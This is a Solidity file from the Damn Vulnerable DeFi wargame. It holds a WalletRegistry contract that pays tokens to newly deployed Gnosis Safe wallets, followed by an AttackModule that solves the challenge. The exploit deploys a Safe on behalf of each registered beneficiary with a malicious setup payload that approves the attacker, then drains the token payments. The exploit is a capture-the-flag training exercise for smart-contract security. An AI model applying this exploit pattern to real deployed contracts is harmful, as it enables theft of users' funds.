// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "hardhat/console.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        require(masterCopyAddress != address(0));
        require(walletFactoryAddress != address(0));

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            addBeneficiary(initialBeneficiaries[i]);
        }
    }

    function addBeneficiary(address beneficiary) public onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    function _removeBeneficiary(address beneficiary) private {
        beneficiaries[beneficiary] = false;
    }

    /**
     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
             setting the registry's address as the callback.
     */
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external override {
        // Make sure we have enough DVT to pay
        require(
            token.balanceOf(address(this)) >= TOKEN_PAYMENT,
            "Not enough funds to pay"
        );

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        require(msg.sender == walletFactory, "Caller must be factory");
        require(singleton == masterCopy, "Fake mastercopy used");

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        console.logBytes(initializer[:4]);
        bytes4 selector = GnosisSafe.setup.selector;
        console.logBytes4(selector);
        require(
            bytes4(initializer[:4]) == GnosisSafe.setup.selector,
            "Wrong initialization"
        );

        // Ensure wallet initialization is the expected
        require(
            GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD,
            "Invalid threshold"
        );
        require(
            GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS,
            "Invalid number of owners"
        );

        // Ensure the owner is a registered beneficiary
        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

        require(
            beneficiaries[walletOwner],
            "Owner is not registered as beneficiary"
        );

        // Remove owner as beneficiary
        _removeBeneficiary(walletOwner);

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        token.transfer(walletAddress, TOKEN_PAYMENT);
    }
}

import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "../DamnValuableToken.sol";

contract AttackModule {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token
    ) {
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;
    }

    function setupToken(address _tokenAddress, address _attacker) external {
        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
    }

    
    function exploit(address[] memory users, bytes memory setupData) external {
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(this),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}
